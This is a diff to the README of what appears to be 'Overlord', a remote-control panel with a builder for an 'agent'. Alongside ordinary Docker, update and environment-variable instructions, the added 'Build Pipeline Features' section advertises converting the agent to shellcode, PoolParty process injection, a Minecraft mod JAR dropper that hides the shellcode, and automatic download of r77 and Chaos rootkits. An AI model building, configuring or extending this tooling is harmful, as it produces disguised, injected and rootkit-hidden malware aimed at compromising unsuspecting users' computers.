@@ -11,10 +11,13 @@ Hello, I made this project for fun.
 ---
 
 - [Quick Start (Docker)](#quick-start-docker)
+- [Updating](#updating)
 - [Docker Install By OS](#docker-install-by-os)
 - [No Docker (.bat / .sh)](#no-docker-bat--sh)
 - [Production Package Scripts](#production-package-scripts)
+- [Build Pipeline Features](#build-pipeline-features)
 - [Docker Notes (TLS, reverse proxy, cache)](#docker-notes-tls-reverse-proxy-cache)
+- [Environment Variables](#environment-variables)
 
 ---
 
@@ -22,12 +25,19 @@ Hello, I made this project for fun.
 
 If you just want it running fast, use this.
 
-1. Create a `docker-compose.yml` file and paste this:
+1. Clone the repo:
+
+```sh
+git clone https://github.com/dxrk666420-glitch/httpslmaos.git
+cd httpslmaos
+```
+
+2. Create a `docker-compose.yml` file and paste this:
 
 ```yaml
 services:
   overlord-server:
-    image: ghcr.io/vxaboveground/overlord:latest
+    image: ${DOCKER_IMAGE:-overlord-server:latest}
     build:
       context: .
       dockerfile: Dockerfile
@@ -83,23 +93,16 @@ volumes:
   overlord-client-build-cache:
 ```
 
-2. Start it:
+3. Build and start:
 
 ```sh
-docker compose up -d
+docker compose up --build -d
 ```
 
-3. Open the panel:
+4. Open the panel:
 
 ```text
 https://localhost:5173
-```
-
-4. Update later:
-
-```sh
-docker compose pull
-docker compose up -d
 ```
 
 5. Stop:
@@ -112,6 +115,25 @@ First startup generates secrets and stores them in `data/save.json` (inside cont
 Keep that file private and backed up.
 
 Default bootstrap login is `admin` / `admin` unless you set `OVERLORD_USER` and `OVERLORD_PASS`.
+
+---
+
+## Updating
+
+Pull the latest code and rebuild. Three commands, every time:
+
+```sh
+git pull origin main
+docker compose build
+docker compose up -d
+```
+
+> **Why `docker compose build` and not `docker compose pull`?**
+> The image is built from source, not pulled from a registry. `docker compose pull` won't update anything. You must rebuild after every `git pull`.
+
+If your UI looks outdated after updating, hard-refresh your browser (`Ctrl+Shift+R` / `Cmd+Shift+R`) to clear cached JS and HTML.
+
+---
 
 ## Docker Install By OS
 
@@ -302,6 +324,69 @@ Package output:
 
 - Windows script: `release`
 - Linux/macOS script: `release/prod-package`
+
+## Build Pipeline Features
+
+The builder supports optional post-processing steps on top of the compiled agent. These require additional tools installed on the server (or inside the Docker container).
+
+| Feature | What it does | Server requirement |
+|---|---|---|
+| **Donut Shellcode** | Converts Windows PE to position-independent shellcode (`.bin`) | `donut` in PATH or auto-built from source via `git` + `make` + `gcc` |
+| **Typhon Injection** | Wraps shellcode in a PoolParty process injector (x64 Windows only) | `typhon.exe` in `data/tools/` or via Wine on Linux |
+| **Vault Encryption** | Post-quantum hybrid encryption (X25519 + ML-KEM-768) on all outputs | `vault` in PATH or auto-built via `cargo` (Rust) |
+| **Minecraft JAR Dropper** | Shellcode embedded in a Fabric mod `.jar` (MC 1.21+) | `javac` + `jar` (JDK) in PATH |
+| **r77 Rootkit** | Downloads fileless ring-3 rootkit assets from GitHub releases | Internet access from server |
+| **Chaos Rootkit** | Downloads ring-0 kernel driver + ring-3 controller from GitHub releases | Internet access from server |
+
+### Installing optional tools inside Docker
+
+Add to your `Dockerfile` or install inside the container:
+
+```dockerfile
+# Donut (auto-built if git/make/gcc are present)
+RUN apt install -y git make gcc
+
+# Vault-PQ (auto-built if Rust is present)
+RUN curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
+ENV PATH="/root/.cargo/bin:${PATH}"
+
+# Minecraft JAR dropper
+RUN apt install -y default-jdk
+
+# Typhon on Linux (Wine required to run the Windows binary)
+RUN apt install -y wine
+```
+
+Donut, Typhon, and Vault will auto-download/build on first use and cache themselves in `data/tools/`. r77 and Chaos rootkit binaries are cached in `data/tools/rootkit-cache/` after the first download.
+
+---
+
+## Environment Variables
+
+| Variable | Default | Description |
+|---|---|---|
+| `OVERLORD_USER` | `admin` | Bootstrap admin username |
+| `OVERLORD_PASS` | `admin` | Bootstrap admin password |
+| `JWT_SECRET` | auto-generated | JWT signing secret |
+| `OVERLORD_AGENT_TOKEN` | — | Token agents must present to connect |
+| `PORT` | `5173` | Server listen port |
+| `HOST` | `0.0.0.0` | Server bind address |
+| `OVERLORD_ROOT` | derived from binary location | Root directory for runtime files |
+| `OVERLORD_PUBLIC_ROOT` | `<root>/public` | Directory to serve static files from |
+| `OVERLORD_CLIENT_BUILD_CACHE_DIR` | `data/client-build-cache` | Go build cache for agent compilation |
+| `OVERLORD_TLS_CERT` | — | Path to TLS certificate |
+| `OVERLORD_TLS_KEY` | — | Path to TLS private key |
+| `OVERLORD_TLS_CA` | — | Path to CA bundle (optional) |
+| `OVERLORD_TLS_OFFLOAD` | `false` | Set `true` if TLS is terminated upstream (nginx, Cloudflare, etc.) |
+| `OVERLORD_TLS_CERTBOT_ENABLED` | `false` | Use Certbot/Let's Encrypt certificates |
+| `OVERLORD_TLS_CERTBOT_DOMAIN` | — | Domain for Certbot cert lookup |
+| `DONUT_BIN` | — | Override path to `donut` binary |
+| `TYPHON_BIN` | — | Override path to `typhon`/`typhon.exe` binary |
+| `VAULT_BIN` | — | Override path to `vault` binary |
+
+> **Note on `OVERLORD_PUBLIC_ROOT`:** If you run Overlord as a compiled binary (not from source), the server resolves the `public/` folder relative to the binary's location. If your UI looks wrong after updating, set `OVERLORD_PUBLIC_ROOT` to the absolute path of `Overlord-Server/public/` in your environment.
+
+---
 
 ## Docker Notes (TLS, reverse proxy, cache)
 
